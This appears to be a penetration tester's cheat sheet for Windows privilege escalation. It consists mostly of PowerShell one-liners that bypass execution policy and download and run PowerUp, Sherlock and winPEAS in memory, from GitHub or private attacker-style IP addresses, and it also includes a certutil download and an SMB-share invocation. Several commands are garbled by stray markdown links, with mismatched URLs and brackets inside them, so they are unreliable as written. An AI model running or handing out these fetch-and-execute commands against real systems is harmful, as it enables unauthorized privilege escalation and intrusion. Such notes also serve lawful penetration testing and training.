
<https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1>


Execution policy bypass, runs PowerUp.ps1 and does the Invoke-AllCheck functionality against target system all in memory:
powershell.exe -nop -ep bypass IEX (New-Object Net.WebClient).DownloadString('[http://192.168.119.228/PowerUp.ps1');Invoke-AllChecks](http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks)
powershell.exe -nop -ep bypass IEX (New-Object Net.WebClient).DownloadString('[http://10.8.24.10/PowerUp.ps1');Invoke-AllChecks](http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks)


powershell.exe -c "wget -useb <https://raw.githubusercontent.com/punishell/ADCheatSheet/refs/heads/master/PowerUp.ps1> | iex; Invoke-AllChecks"

most recent
powershell.exe -c "wget -useb <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1> | iex; Invoke-AllChecks"


Invoking script from smb share:
powershell -ep bypass . \\TSCLIENT\share\PowerUp.ps1;Invoke-AllChecks

Useful commands(must be ran from powershell):
Invoke-AllChecks
Invoke-AllChecks > up.log
Get-Help Invoke-ServiceAbuse -Examples

From cmd and saves output in up.log:
powershell -nop -ep bypass . .\PowerUp.ps1;Invoke-AllChecks > up.log

Automation tools for PrivEsc:

Execution policy bypass, runs PowerUp.ps1 and does the Invoke-AllCheck functionality against target system all in memory:
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1>[');Invoke-AllChecks](http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks)

certutil -urlcache -split -f <https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/winPEAS.bat>
.\winPEAS.bat 

powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1>[');Find-AllVulns](http://192.168.119.157/Sherlock.ps1');Find-AllVulns)


powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1>[');Invoke-AllChecks](http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks)

powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('[http://10.8.24.10/PowerUp.ps1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)[');Invoke-AllChecks](http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks) > powerup.log

